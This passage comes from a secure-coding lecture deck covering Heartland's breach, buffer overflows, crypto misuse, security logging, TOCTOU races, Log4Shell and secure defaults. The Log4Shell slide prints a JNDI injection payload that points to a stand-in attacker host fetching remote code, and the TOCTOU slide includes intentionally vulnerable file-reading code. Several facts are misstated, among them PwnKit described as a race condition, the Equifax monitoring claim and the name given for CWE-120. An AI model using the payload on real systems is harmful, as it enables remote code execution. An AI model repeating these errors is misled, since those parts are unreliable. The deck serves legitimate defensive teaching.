The post-breach consequences were severe and multidimensional. Direct financial settlements paid to Visa, Mastercard, and American Express exceeded $130 million. Heartland was removed from the Visa and Mastercard lists of PCI-DSS-compliant processors, effectively prohibiting merchants from routing card transactions through Heartland's network, an existential business threat that required emergency compliance remediation. The company's stock price fell by more than 75% in the months following the breach disclosure. Albert Gonzalez was sentenced to 20 years in federal prison in 2010, at the time the longest sentence ever imposed for computer crimes in U.S. history. His co-conspirators received sentences ranging from five to fifteen years.

The remediation path for the initial access vector was straightforward: a company policy requiring all database queries to use parameterized statements, enforced through SAST tooling and code review, would have prevented the SQL injection that provided the attacker's initial foothold. Without network access to the payment processing servers, the RAM-scraping malware could not have been installed. The entire $130 million breach stemmed from the absence of a secure coding practice that requires exactly zero additional infrastructure investment, it is purely a development team practice and tooling choice. NIST SP 800-53 Revision 5 control SI-10 (Information Input Validation) and the PCI-DSS requirement 6.2.4 (addressing injection attacks through secure coding) both require the parameterized query control that would have prevented this breach. PCI-DSS 4.0 Requirement 6.2.4 now explicitly requires that web-facing applications be protected from injection attacks, with automated technical controls (SAST or DAST) required to verify this protection annually and after significant changes.
:::

%%%
---
unit: SDLC
code: MEM
title: "Memory Safety Vulnerabilities: Buffer Overflows and CWE-119"
---
:::callout style=soft
**Memory safety vulnerabilities**, buffer overflows (CWE-120), use-after-free (CWE-416), and integer overflows (CWE-190), are the dominant vulnerability class in C and C++ codebases, accounting for approximately 70% of all critical Microsoft CVEs and 65% of Chrome security bugs according to their respective security teams.
:::

::::columns ratio=1:1
::col::
::::card heading="Buffer Overflow (CWE-120)"
:::list style=tight
- **Root Cause**: Writing more bytes to a fixed-size memory buffer than it was allocated to hold, overwriting adjacent memory.
- **Impact**: Overwriting return addresses to redirect execution (stack overflow), overwriting function pointers, or corrupting adjacent heap objects (heap overflow).
- **Classic Example**: `strcpy(dest, user_input)`, no length check; if `user_input` exceeds `dest`'s allocated size, adjacent stack memory is overwritten.
- **Defense**: Use bounds-checking functions (`strncpy` with explicit length, `snprintf`), or safer languages (Rust, Go) with built-in bounds checking.
:::
::::
::col::
::::card heading="Use-After-Free (CWE-416)"
:::list style=tight
- **Root Cause**: Accessing a memory pointer after the memory it pointed to has been freed, when the freed memory may have been reallocated to a different object.
- **Impact**: Attackers can control the value placed in freed memory through heap manipulation, then trigger the use-after-free to execute arbitrary code.
- **Modern Prevalence**: Use-after-free bugs account for the majority of Chrome renderer CVEs and are frequently exploited in browser-based attacks via malicious web pages.
- **Defense**: Smart pointers (C++ `unique_ptr`, `shared_ptr`), memory-safe languages (Rust's ownership model provides compile-time use-after-free prevention).
:::
::::
::::

:::image src="images/23_buffer_overflow_stack_diagram.png" alt="Stack memory layout diagram on white background. Two side-by-side stack frames: Normal Execution (left) and After Buffer Overflow (right). Both stacks show from bottom to top: Return Address, Saved Frame Pointer, Local Variable B (4 bytes), Buffer A (8 bytes allocated), then arrows pointing up to 'Stack grows downward.' In the normal case, Buffer A contains 'HELLO' (5 bytes, green), other regions are intact. In the overflow case, Buffer A contains 'AAAAAAAAAAAAAAAA' (16 A's, red) overflowing into Local Variable B, then into Saved Frame Pointer, then into Return Address which now shows attacker-controlled value 0xDEADBEEF pointing to shellcode. Red overflow arrows indicate the overwrite direction. The overwritten return address is highlighted in bright red with a skull icon labeled 'Control flow hijacked.'" caption="Stack buffer overflow: when user-supplied data exceeds the allocated buffer size and no bounds check is performed, adjacent stack memory including the return address is overwritten, redirecting program execution to attacker-controlled code." width=full
:::

:::notes
Memory safety vulnerabilities represent a distinct category from the web application vulnerabilities covered earlier in this lecture, because they operate at the level of the process memory model rather than at the application protocol or logic level. While SQL injection and XSS exploit flaws in how applications handle data in the context of interpreters (database engines and browsers), memory safety vulnerabilities exploit flaws in how programs manage their own memory allocation, deallocation, and access. These vulnerabilities are predominantly a concern in C and C++ codebases because those languages expose direct memory management through raw pointers and manual allocation, without the automatic bounds checking and garbage collection that higher-level languages provide.

The significance of memory safety vulnerabilities in the broader security landscape is extraordinary. In 2019, the Microsoft Security Response Center published an analysis of all CVEs addressed by Microsoft security updates over the preceding twelve years and found that approximately 70% of those CVEs were caused by memory safety issues. In 2020, the Chrome security team published a similar analysis of their high-severity Chrome bugs and found that approximately 70% were also memory safety issues, with use-after-free being the single largest subcategory. The NSA released a cybersecurity information sheet in 2022 recommending that organizations transition from C and C++ to memory-safe programming languages specifically to address this vulnerability class at its root.

A buffer overflow (CWE-120, Non-null-terminated Returned Value or Buffer Overflow) occurs when a program writes data to a fixed-size memory buffer without verifying that the data fits within the allocated size. The C standard library function `strcpy(dest, src)` is the classic example: it copies bytes from `src` to `dest` until it encounters a null terminator in `src`, with no regard for the size of `dest`. If `src` contains more bytes than `dest` was allocated to hold, `strcpy` will continue writing past the end of `dest` into whatever memory is adjacent on the stack or heap. On the stack, adjacent memory typically contains the saved frame pointer and the return address, the address to which execution returns after the current function completes. By crafting input that precisely fills the buffer and then overwrites the return address with an attacker-chosen value, an attacker can redirect program execution to attacker-controlled code (shellcode) or, in modern exploit techniques, to existing code in the program's binary (return-oriented programming, ROP).

Use-after-free vulnerabilities (CWE-416) occur when a program accesses a pointer after the memory it pointed to has been freed to the heap allocator. In modern heap allocator designs, freed memory regions are placed in free lists and may be reallocated to satisfy subsequent allocation requests. If an attacker can influence what data is placed in the freed region (a technique called heap grooming or heap feng shui), they can control the value that the program reads when it dereferences the stale pointer, potentially redirecting a virtual function call to attacker-controlled code. Use-after-free is particularly prevalent in C++ object-oriented code where object ownership semantics are complex and destructor/deallocation ordering is non-obvious.

The primary systemic defense against memory safety vulnerabilities is language selection. Rust is the most prominent example of a systems programming language designed to provide the performance characteristics of C/C++ with compile-time memory safety guarantees. Rust's ownership type system, enforced by the compiler's borrow checker, statically prevents use-after-free bugs (by enforcing that references cannot outlive the objects they refer to), data races (by enforcing exclusive mutable access), and double-free bugs (by tracking ownership statically). For existing C/C++ codebases where migration is not immediately feasible, compensating controls include ASAN (AddressSanitizer) and UBSAN (UndefinedBehaviorSanitizer) during testing, compiler flags (`-fstack-protector`, `-D_FORTIFY_SOURCE=2`), bounds-checking library alternatives, and memory-safe language wrappers for security-critical components. NIST SP 800-218 (SSDF) practice PW.6.1 recommends that organizations use compiler options, tool-assisted code review, and code review techniques to address memory management errors, explicitly naming buffer overflows as a target category.
:::

%%%
---
unit: Input Handling
code: CRY
title: "Cryptography in Code: Common Misuses"
---
:::callout style=soft
The most dangerous cryptographic errors are not theoretical mathematical weaknesses but **implementation misuses**: using the wrong algorithm for the task, generating keys and IVs incorrectly, or trusting cryptography to solve problems it cannot address. OWASP A02:2021 (Cryptographic Failures) covers these errors.
:::

:::table
| Misuse Pattern | CWE | Correct Practice |
|---|---|---|
| MD5 or SHA-1 for password storage | CWE-916 | Argon2id (work factor ≥ recommended OWASP values) |
| CBC mode encryption without integrity check | CWE-649 | Authenticated encryption: AES-GCM or ChaCha20-Poly1305 |
| Hardcoded or static encryption key | CWE-321 | Key derived per user/session; stored in secrets manager |
| Using `Math.random()` or `random.random()` for tokens | CWE-338 | OS CSPRNG: `secrets.token_hex()`, `crypto.randomBytes()` |
| ECB mode block cipher (reveals patterns) | CWE-327 | CBC with random IV (confidentiality only) or AES-GCM |
| TLS certificate validation disabled | CWE-295 | Never set `verify=False`; pin certificates for critical services |
| Short RSA key (1024-bit) | CWE-326 | RSA-2048 minimum; prefer ECDSA P-256 for new deployments |
:::

:::image src="images/23_ecb_vs_gcm_encryption_modes.png" alt="Two-part illustration of AES block cipher modes. Left part: AES-ECB mode. A test image of a recognizable shape (stylized penguin silhouette) is shown before encryption. After AES-ECB encryption, the encrypted version still clearly shows the original shape outlines because ECB encrypts each 16-byte block independently, identical plaintext blocks produce identical ciphertext blocks. Red label: 'ECB: Structure visible through encryption.' Right part: AES-GCM mode. Same input image after AES-GCM encryption shows completely random-looking noise with no discernible structure. Additionally, a green authentication tag icon is shown alongside the ciphertext, labeled 'GCM: Authentication tag prevents tampering.' Below both: a comparison table showing ECB (no IV, no authentication, not semantically secure, never use) versus GCM (random nonce/IV, authentication tag, semantically secure, recommended)." caption="The ECB mode illustration is a classic demonstration that 'encrypted' does not mean 'secure': ECB encrypts each 16-byte block independently, so identical plaintext blocks produce identical ciphertext blocks, leaking pattern information through the encryption. AES-GCM provides both confidentiality and integrity." width=full
:::

:::notes
Cryptography is a domain where intuition and effort do not translate directly to security. A developer can work extremely hard to implement what appears to be a cryptographic protection scheme and still produce a system that provides negligible security, if the implementation makes any of the common cryptographic misuse errors documented in CWE and OWASP A02:2021. The guidance from professional cryptographers is consistent: developers should not implement cryptographic primitives from scratch, and they should use the highest-level cryptographic library available for their language rather than composing primitives manually. "Don't roll your own crypto" is the shorthand formulation of this principle.

Password hashing is one of the most well-documented cryptographic misuse areas. MD5 and SHA-1 are general-purpose cryptographic hash functions that were designed for speed, to quickly produce a fixed-length fingerprint of data. This speed property is catastrophic for password storage: a modern GPU can compute approximately 10 billion MD5 hashes per second, meaning a modern cracking rig can exhaustively test all lowercase 8-character alphanumeric passwords (approximately 2.8 trillion combinations) in roughly 5 minutes. Argon2id, by contrast, is deliberately designed to be slow and memory-intensive: the OWASP recommended configuration (3 iterations, 64 MB memory, 4 parallel threads) requires approximately 700 milliseconds per hash on typical server hardware. The same cracking rig that can test 10 billion MD5 hashes per second can test fewer than 2 Argon2id hashes per second at this configuration, making offline brute-force attacks economically infeasible even for common passwords.

Authenticated encryption deserves particular attention. Many developers correctly understand that data at rest must be encrypted, and select a valid symmetric encryption algorithm (AES), but then apply it in a mode that provides only confidentiality and not integrity. AES in CBC (Cipher Block Chaining) mode encrypts data such that an observer cannot read the plaintext, but it does not detect whether the ciphertext has been modified. This enables padding oracle attacks (Vaudenay's 2002 attack formalized this; CVE-2019-1559 in OpenSSL was a padding oracle variant) where an attacker can decrypt CBC-mode ciphertext without the key by submitting modified ciphertexts to a decryption oracle and observing whether a padding error occurs. Authenticated encryption modes, specifically AES-GCM (AES in Galois/Counter Mode) and ChaCha20-Poly1305, solve this by computing an authentication tag over the ciphertext during encryption and verifying this tag before decryption. Any modification of the ciphertext causes authentication to fail and decryption to be aborted. Applications should exclusively use authenticated encryption for any use case where the encrypted data might be exposed to modification by untrusted parties.

The ECB mode illustration in the slide image is the most famous visual demonstration in cryptography education: encrypting an image with AES in ECB mode produces a ciphertext image in which the original image's structure and patterns remain clearly visible, because ECB encrypts each 16-byte block independently. Identical plaintext blocks produce identical ciphertext blocks, so the spatial patterns in the image are preserved through the encryption. This demonstrates concretely that an encryption algorithm applied in the wrong mode provides no semantic security despite using a strong cipher. This example, often called the "ECB penguin" in security education (originally using the Linux Tux mascot image), makes the abstract concept of "cipher mode matters" immediately visually intuitive.

Random number generation for security tokens is another common failure point. JavaScript's `Math.random()` and Python's `random.random()` are Mersenne Twister–based pseudorandom number generators. The Mersenne Twister's internal state can be reconstructed by observing approximately 624 consecutive outputs, after which all future outputs become completely predictable. An attacker who observes 624 session tokens generated using `Math.random()` can predict all future session tokens, enabling session hijacking without any network access to the victim. Language-specific CSPRNG APIs, `secrets.token_hex()` in Python, `crypto.randomBytes()` in Node.js, `SecureRandom` in Java, `RandomNumberGenerator.GetBytes()` in .NET, all draw entropy from the operating system's hardware entropy pool and are specifically designed to be unpredictable even given all previously generated values. NIST SP 800-90A defines the approved deterministic random bit generators (DRBGs) that comply with FIPS 140-3 requirements for federal systems.
:::

%%%
---
unit: SDLC
code: LOG
title: "Security Logging and Audit Trails"
---
:::callout style=soft
Security logging captures evidence of security events for detection, forensic investigation, and compliance. **OWASP A09:2021 – Security Logging and Monitoring Failures** covers the risk of applications that generate insufficient, incorrect, or unprotected log data. NIST SP 800-92 governs security log management.
:::

:::list style=tight
- **What to Log**: Authentication events (success, failure, MFA bypass attempt), authorization failures (access denied), input validation failures (repeated invalid submissions), administrative actions, privilege changes, and session lifecycle events (creation, logout, expiry).
- **What NOT to Log**: Passwords (even failed login passwords), session tokens, payment card numbers, unmasked personal identifiers, API keys, or other secrets that would create secondary exposure through log access.
- **Log Format**: Structured logging (JSON) rather than freeform text allows log aggregation systems (SIEM) to parse, index, and alert on specific fields. Every log entry must include: timestamp (ISO 8601 UTC), event type, user ID, session ID hash, source IP, and outcome.
- **Log Integrity**: Logs must be tamper-evident. Use append-only storage, cryptographic log chaining (hash of previous entry embedded in each entry), or centralized log forwarding to a SIEM before an attacker can modify local logs.
- **Alerting**: Define alert rules for security-relevant event patterns: more than 5 authentication failures from the same IP in 1 minute, any access to administrative endpoints by non-admin roles, any use of deprecated API endpoints, any input that matches known attack payloads.
- **Retention**: PCI-DSS requires 12 months of log retention (3 months immediately accessible). HIPAA requires 6 years. GDPR requires that logs containing personal data be subject to data minimization and retention limitation principles.
:::

:::image src="images/23_security_logging_architecture.png" alt="Security logging architecture diagram on white background. Application servers (Web App, API Gateway, Auth Service) each emit structured JSON log events. Events flow via a log forwarder (Filebeat, Fluentd) to a centralized SIEM platform (Splunk, Elasticsearch/Kibana, Microsoft Sentinel). Within the SIEM, two paths: (1) Real-time alert path: alert rules fire on suspicious patterns (>5 auth failures/minute) → alert sent to SOC dashboard and on-call engineer via PagerDuty. (2) Forensic investigation path: log search and timeline reconstruction for incident response. An append-only log storage icon on the right shows logs being written with hash-chaining for tamper evidence. A red icon shows what is blocked from logs: passwords, tokens, card numbers. A green icon shows what is required in logs: timestamp, user ID, IP, outcome." caption="Security logging architecture: structured events flow from all application components to a centralized SIEM, providing both real-time alerting on anomalous patterns and a forensic record for post-incident investigation." width=full
:::

:::notes
Security logging is the primary means by which security teams detect active attacks, establish the timeline of a breach for forensic analysis, and satisfy regulatory compliance obligations for audit trail maintenance. Despite its importance, OWASP A09:2021 – Security Logging and Monitoring Failures consistently appears in the OWASP Top 10 because organizations either fail to log security-relevant events at all, log insufficient detail to reconstruct an attack timeline, fail to protect logs from attacker modification, or fail to monitor logs with alerting rules that would detect anomalous patterns in real time.

The fundamental logging principle for security is completeness plus protection of sensitive data. The completeness requirement means capturing every event that a security analyst might need to reconstruct an incident timeline or answer the question "how did the attacker move from point A to point B?" Authentication events, both successful logins and failed attempts, are among the most valuable security signals. A pattern of five failed login attempts from the same IP address against the same account in one minute indicates a brute-force attack in progress. A successful login from a country where the user has never previously authenticated, immediately after a successful login from their usual country, may indicate account takeover through credential stuffing. Authorization failures, HTTP 403 responses to API requests, indicate that an authenticated user is probing endpoints beyond their access level, which may indicate privilege escalation attempts or IDOR enumeration.

The protection-of-sensitive-data requirement exists in tension with completeness and requires explicit filtering. Logging the username that failed authentication is appropriate for forensics. Logging the password that was submitted (even if incorrect) creates a secondary credential exposure: any analyst, system administrator, or attacker who gains access to the log file now has access to users' attempted passwords, which for most users are variants or reuses of their actual passwords for other services. PCI-DSS Requirement 10.3.3 explicitly prohibits logging of full primary account numbers (card numbers) in security event logs. HIPAA requires that access to logs containing PHI be access-controlled and audited. GDPR's data minimization principle (Article 5(1)(c)) limits log retention of personal data to what is necessary for the stated purpose.

Log integrity protection is critical for post-incident forensics, because the first action many attackers take after gaining system access is to modify or delete log entries that would reveal their presence or activities. The 2017 Equifax breach post-mortem found that the attackers had disabled SSL inspection on the Equifax network, which had the side effect of hiding their network traffic from monitoring tools for over 76 days. Log integrity mechanisms include forwarding log entries to a remote, access-controlled SIEM before the local log can be modified; implementing append-only file system semantics for log storage; and cryptographic log chaining, where each log entry embeds a hash of the previous entry, making retroactive modification of historical entries detectable. These controls ensure that even if an attacker gains root access to an application server and modifies local logs, the centralized SIEM copy remains intact and tamper-evident.

The NIST Cybersecurity Framework (CSF) 2.0 Detect function (DE.AE, DE.CM) formalizes the requirement for security logging and monitoring, requiring that organizations establish baselines of normal network operations and data flows to detect anomalous events. NIST SP 800-92 (Guide to Computer Security Log Management) provides detailed operational guidance on log generation, collection, storage, and analysis. ISO/IEC 27001:2022 Annex A control 8.15 (Logging) and 8.16 (Monitoring Activities) together require that event logs be produced and protected, and that network, system, and application behavior be monitored for anomalies. The Splunk SIEM platform, the Elastic Stack (Elasticsearch, Logstash, Kibana), and Microsoft Sentinel are the most widely deployed SIEM solutions for centralized security log management in enterprise environments. Open-source options including Wazuh and Graylog provide equivalent capabilities for organizations that prefer on-premises solutions without commercial licensing costs.
:::

%%%
---
unit: Testing
code: RAC
title: "Race Conditions and TOCTOU Vulnerabilities"
---
:::callout style=soft
**Race conditions** (CWE-362) occur when a program's behavior depends on the relative timing of concurrent operations. **Time-of-Check to Time-of-Use (TOCTOU)** is the most security-critical race condition pattern: the state verified by a security check changes before the protected operation uses it.
:::

::::columns ratio=1:1
::col::
:::code language=python caption="TOCTOU vulnerability in file access (CWE-367)"
import os

def process_user_file(filepath):
    # TIME OF CHECK: verify the path is safe
    if not filepath.startswith('/safe/uploads/'):
        raise PermissionError("Access denied")
    
    # GAP: attacker replaces filepath target
    # with a symlink to /etc/passwd here
    
    # TIME OF USE: open the file
    # The path still looks safe but now
    # points to /etc/passwd via symlink
    with open(filepath, 'r') as f:
        return f.read()  # reads /etc/passwd
:::
::col::
:::code language=python caption="TOCTOU mitigation using atomic operations"
import os

def process_user_file(filepath):
    # Open the file descriptor atomically
    # O_NOFOLLOW prevents symlink following
    fd = os.open(
        filepath,
        os.O_RDONLY | os.O_NOFOLLOW
    )
    try:
        # Validate AFTER opening the fd:
        # stat the open fd, not the path
        stat = os.fstat(fd)
        real_path = os.readlink(
            f'/proc/self/fd/{fd}'
        )
        if not real_path.startswith('/safe/uploads/'):
            raise PermissionError("Symlink attack detected")
        with os.fdopen(fd, 'r') as f:
            return f.read()
    except:
        os.close(fd)
        raise
:::
::::

:::image src="images/23_toctou_race_condition_diagram.png" alt="Thread timing diagram on white background showing a TOCTOU race condition. Two parallel horizontal timelines: Thread 1 (Application) and Thread 2 (Attacker). Time flows left to right. Thread 1 events: t1 = Check: filepath starts with /safe/uploads/ — PASSES. t3 = Use: open(filepath), reads attacker-controlled file. Thread 2 events: t2 = Between t1 and t3: replace /safe/uploads/user.txt with symlink pointing to /etc/passwd. A red arrow labeled 'Race Window' spans from t1 to t3 on Thread 1's timeline, showing the vulnerability window. A red lightning bolt at t2 shows the attacker action in the race window. At t3, a red arrow shows the open() call following the symlink to /etc/passwd. Below the diagram, a green alternative shows the atomic open-then-check pattern with no race window." caption="TOCTOU race condition: the security check and the protected operation are two separate steps. An attacker who can modify the checked resource between those steps, in the race window, can cause the protected operation to act on different data than the security check evaluated." width=full
:::

:::notes
Race conditions are a class of vulnerability that emerges from concurrent execution, multiple threads, processes, or requests interacting with shared resources without adequate synchronization. The Time-of-Check to Time-of-Use pattern is the security-critical variant: a program checks a security condition at one point in time and then performs an operation based on the assumption that the condition still holds at a later point. If an attacker can modify the relevant state between the check and the use, during the race window, the security check is bypassed. CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization) covers the general race condition category; CWE-367 (Time-of-check Time-of-use Race Condition) specifically addresses the TOCTOU pattern.

The code example in the slide illustrates the classic filesystem TOCTOU vulnerability. The application needs to verify that a user-provided file path is within the safe `/safe/uploads/` directory before reading its contents, to prevent directory traversal attacks. The naive implementation checks the path string at one point in time, then opens the file at a later point. Between those two operations, an attacker who can write to the filesystem can replace the legitimate file with a symbolic link (symlink) pointing to a sensitive file outside the safe directory, such as `/etc/passwd`. When the `open()` call executes, it follows the symlink to the sensitive file while the path check already completed successfully. The race window, the time between the check and the use, can be as small as microseconds, but attackers use race condition tools to make thousands of rapid attempts until they win the race, making even very short windows exploitable in practice.

The secure mitigation relies on atomic operations that eliminate the race window. Instead of checking the path string and then opening a file at the path, the secure approach opens the file with `O_NOFOLLOW` (which prevents the open from following symlinks, causing it to fail if the path refers to a symlink) and then validates the actual file path of the opened file descriptor using the `/proc/self/fd/<fd>` interface on Linux (which resolves the actual file path rather than following the original path). Because the check and the use operate on the same open file descriptor rather than on a path that can be substituted, there is no race window, the validation is performed on the same file object that will be read. This pattern of "open first, validate on the fd" rather than "validate path first, open later" is the canonical TOCTOU defense for filesystem operations.

Race conditions also appear in web application contexts. The classic web TOCTOU example is a bank transfer application: check that the account has sufficient funds (check), then debit the account (use). If this sequence is not implemented with proper database-level transaction locking, a concurrent second request can also pass the balance check before either request has completed the debit, allowing a user to overdraw their account. The correct mitigation uses database-level optimistic locking (`UPDATE accounts SET balance = balance - 100 WHERE id = ? AND balance >= 100`, checking the affected row count) or pessimistic locking (`SELECT ... FOR UPDATE`) to ensure the check and update are atomic at the database level.

TOCTOU vulnerabilities have appeared in several high-profile CVEs. CVE-2021-4034 (PwnKit), a privilege escalation vulnerability in the Linux `pkexec` utility (part of PolicyKit), exploited a TOCTOU race condition in how `pkexec` handled its command-line argument vector, the argument was checked at one point and used at another, allowing an attacker to substitute the argument between the check and the use to execute arbitrary code with root privileges. The vulnerability affected virtually every major Linux distribution by default and had been present in `pkexec` since its introduction in 2009. CVE-2022-0847 (Dirty Pipe) in the Linux kernel also exploited a race condition in the pipe-splicing mechanism to overwrite read-only files. These kernel-level TOCTOU CVEs demonstrate that the race condition vulnerability class extends far beyond application code into operating system kernel components, making it one of the most broadly applicable secure coding concerns.
:::

%%%
---
unit: SDLC
code: LOG4
title: "Case Study: Log4Shell (CVE-2021-44228)"
---
:::callout style=soft
**Log4Shell** (CVE-2021-44228, CVSS 10.0), disclosed December 9, 2021, is the highest-impact supply chain vulnerability in documented history: a critical remote code execution flaw in Apache Log4j, embedded as a transitive dependency in thousands of enterprise Java applications worldwide.
:::

:::steps
1. **Vulnerability Root**: Apache Log4j 2.x (versions 2.0-beta9 through 2.14.1) performed JNDI (Java Naming and Directory Interface) lookups on string patterns embedded in log messages. The pattern `${jndi:ldap://attacker.com/payload}` in any logged string triggered an outbound LDAP lookup to the attacker's server.
2. **Trigger Mechanism**: Any value logged by Log4j, including HTTP headers (User-Agent, X-Forwarded-For), form fields, search queries, usernames, that contained the JNDI lookup pattern triggered the vulnerability. The attack surface was any system that logged any user-supplied input.
3. **Exploitation**: The attacker's LDAP server responded with a reference to a remote Java class. Log4j fetched and instantiated the class, executing arbitrary Java code in the context of the vulnerable application server, a complete remote code execution with the application's privilege level.
4. **Disclosure and Exploitation Timeline**: The vulnerability was disclosed publicly on December 9, 2021. Within hours, mass internet scanning for vulnerable systems began. Active exploitation campaigns targeting cryptocurrency mining, ransomware deployment, and state-sponsored espionage began within 72 hours of public disclosure.
5. **Organizational Impact**: Organizations with mature SCA tooling and SBOMs identified affected applications within hours. Organizations without component inventory required days to weeks of manual auditing across their application portfolio. Some organizations discovered undocumented internal applications were affected only through IDS alerts.
6. **Remediation**: Immediate mitigation: set `log4j2.formatMsgNoLookups=true` or set the `LOG4J_FORMAT_MSG_NO_LOOKUPS` environment variable. Permanent remediation: upgrade to Log4j 2.17.1 (Java 8), 2.12.4 (Java 7), or 2.3.2 (Java 6), or migrate to a non-affected logging framework.
:::

:::image src="images/23_log4shell_attack_flow.png" alt="Attack flow diagram for Log4Shell on white background. Attacker icon on left. Application server in center. Attacker's LDAP/HTTP server on right. Step 1: Attacker sends HTTP request to application server with User-Agent header containing ${jndi:ldap://attacker.com/Exploit}. Step 2: Application logs the User-Agent string via Log4j, Log4j parses the JNDI lookup pattern. Step 3: Log4j makes outbound LDAP query to attacker.com. Step 4: Attacker's LDAP server returns reference to remote Java class at http://attacker.com/Exploit.class. Step 5: Log4j fetches Exploit.class via HTTP. Step 6: JVM loads and instantiates Exploit.class, arbitrary Java code executes on the application server. Reverse shell connection shown from Step 6 back to attacker. Red arrows for attack flow; timeline at bottom shows the 6 steps with labels." caption="Log4Shell attack flow: a single crafted string in any HTTP header, form field, or user input that gets logged triggers an outbound JNDI lookup, which fetches and executes attacker-controlled Java code. The attack requires no authentication and no knowledge of the target application." width=full
:::

:::notes
Log4Shell stands apart from other vulnerability disclosures in its combination of severity, breadth of impact, and the clarity with which it illustrated the organizational capabilities required for effective vulnerability response. Understanding it in depth provides a complete picture of supply chain security risk, the operational importance of SBOMs, and the challenge of coordinated disclosure at internet scale.

Apache Log4j is a Java logging framework that has been a de facto standard in Java application development for over two decades. Its breadth of deployment is almost impossible to overstate: Log4j was included as a direct or transitive dependency in Apache Struts, Apache Solr, Apache Druid, Apache Flink, Elasticsearch, VMware vCenter, Cisco security products, Juniper networks equipment, numerous cloud services, and tens of thousands of commercial and open-source Java applications. CISA estimated that hundreds of millions of devices worldwide were potentially affected.

The vulnerability was rooted in a feature added to Log4j 2.x called "message lookup substitution," which allowed log messages to contain expressions that Log4j would evaluate at logging time. The JNDI lookup was one such expression: `${jndi:ldap://server/path}` caused Log4j to make an LDAP query to the specified server and use the returned value in the log message. While designed for legitimate configuration purposes, this feature created a catastrophic attack surface: any attacker who could cause their input to be logged, trivially achievable through any externally facing HTTP header, form field, search query, or API parameter, could inject a JNDI lookup expression. The attack required no authentication, no knowledge of the target application's internal structure, and no exploitation of the application's own logic.

The organizational response to Log4Shell provided a natural experiment in security program maturity. Organizations that had implemented continuous SCA scanning with dependency inventory could query their asset management system: "which applications declare Log4j between versions 2.0-beta9 and 2.14.1 as a direct or transitive dependency?" and receive results in seconds. These organizations had a prioritized remediation list within hours of the December 9 disclosure. Organizations without SCA tooling had no component inventory and were forced to conduct manual audits, searching through source code repositories, build artifacts, and server file systems for evidence of Log4j inclusion. Many organizations with complex microservice architectures discovered applications they did not know existed, or discovered Log4j included by third-party vendors whose software ran in their environments. Some organizations were still discovering affected systems weeks after the initial disclosure.

The Log4j vulnerability also highlighted the challenge of transitive dependency management. Many organizations initially believed they were safe because they did not directly depend on Log4j, only to discover that a library they did depend on had a transitive dependency on Log4j. SBOM tooling that records the full transitive dependency tree, not just direct dependencies, is essential for complete supply chain visibility. CISA, NSA, ODNI, and FBI jointly released a cybersecurity advisory (AA21-356A) recommending immediate patching, temporary mitigation measures, and, for the longer term, software composition analysis and SBOM practices. NIST assigned CVE-2021-44228 a CVSS base score of 10.0, the maximum possible score, reflecting its combination of network exploitability (remotely exploitable with no local access required), attack complexity (low, requiring no special conditions), privileges required (none), user interaction (none), and impact scope (critical confidentiality, integrity, and availability impact). NIST SP 800-161 (Supply Chain Risk Management) and NIST SP 800-218 (SSDF) both identify supply chain vulnerability management as a critical organizational capability, and Log4Shell is the definitive empirical validation of that prioritization.
:::

%%%
---
unit: SDLC
code: DEF
title: "Secure Defaults and Configuration Hardening"
---
:::callout style=soft
**OWASP A05:2021 – Security Misconfiguration** is one of the most prevalent OWASP Top 10 categories, arising from insecure default configurations, unnecessary features left enabled, default credentials unchanged, and overly permissive access controls. The principle of **Secure by Default** mandates that security controls are active without requiring developer action.
:::

:::table
| Misconfiguration Type | Risk | Secure Default |
|---|---|---|
| Default admin credentials (admin/admin) | Account takeover | Force credential reset on first login; disable defaults |
| Directory listing enabled on web server | Path and file disclosure | Disable directory listing in web server config |
| Debug mode in production (`DEBUG=True`) | Stack traces, secret exposure | Require explicit opt-in; default to `DEBUG=False` |
| Unnecessary HTTP methods (TRACE, PUT) | XST attack, unauthorized writes | Restrict to `GET`, `POST`, `DELETE`, `PATCH` only |
| Permissive CORS policy (`Access-Control-Allow-Origin: *`) | Cross-origin credential theft | Specify exact allowed origins; never use `*` with credentials |
| Unused open ports and services | Expanded attack surface | Close all non-required ports; stop unused services |
| Missing security headers (HSTS, CSP, X-Frame-Options) | Protocol downgrade, XSS, clickjacking | Set security headers in every response by default |
:::

:::image src="images/23_secure_default_configuration_checklist.png" alt="Security configuration checklist infographic on white background. Title: 'Secure Configuration Checklist: Production Deployment.' Checklist organized in four sections. Web Server section: checkboxes for Directory listing disabled, DEBUG mode off, Error pages generic, TRACE/OPTIONS methods disabled. Authentication section: Default credentials changed, MFA enabled for admin accounts, Password policy enforced, Account lockout enabled. HTTP Headers section: HSTS max-age=31536000 set, CSP header configured, X-Content-Type-Options: nosniff set, X-Frame-Options: DENY set. Dependencies section: All packages at latest stable versions, No dev-only packages in production, License compliance verified, SBOM generated. Each checkbox is checked with a green tick or marked with a red X (unchecked) to show common defaults versus required states. Source label: Based on CIS Benchmarks and OWASP Security Configuration Guide." caption="Secure configuration checklist: each item represents a commonly misconfigured setting that is insecure by default in many frameworks and servers. Hardening guides from CIS, DISA STIG, and OWASP provide prescriptive baseline configurations for each technology stack." width=full
:::

:::notes
Security misconfiguration consistently ranks among the top three most prevalent OWASP categories across all editions of the Top 10, and it occupies OWASP A05:2021 in the current edition. Unlike many vulnerability categories that require complex exploitation techniques, security misconfiguration vulnerabilities are often trivially exploitable, default credentials require no exploitation at all, just knowledge of the defaults. Yet they persist pervasively in production systems because the secure configuration state requires active effort to achieve, while the insecure default state is what you get if you do nothing.

The principle of Secure by Default addresses this asymmetry at the framework and product design level: rather than shipping products in insecure configurations that require developers to actively enable security, frameworks and platforms should ship in maximally secure configurations that require developers to explicitly opt out of security controls they do not need. The Python Flask web framework's `DEBUG` mode is a classic example of the failure of this principle: Flask ships with `DEBUG=True` as a development convenience, enabling the interactive Werkzeug debugger that allows arbitrary Python code execution through the browser. Deploying a Flask application to production with `DEBUG=True`, as happens with copy-pasted development configurations, exposes a full remote code execution interface to any network user who encounters an application error. A Secure by Default design would default `DEBUG=False` and require developers to explicitly set `DEBUG=True` for development.

The CORS (Cross-Origin Resource Sharing) `Access-Control-Allow-Origin: *` misconfiguration is another common secure-coding-adjacent configuration error. When an API responds with this header, it tells browsers that any web page on any domain may make JavaScript AJAX requests to the API and read the responses. If the API also accepts `Access-Control-Allow-Credentials: true`, then those cross-origin requests include the user's authentication cookies, allowing a malicious web page to make authenticated API requests on behalf of the user and read the responses. The correct configuration specifies exactly which origins are permitted to make cross-origin requests with credentials, typically only the specific web application domain(s) the API serves.

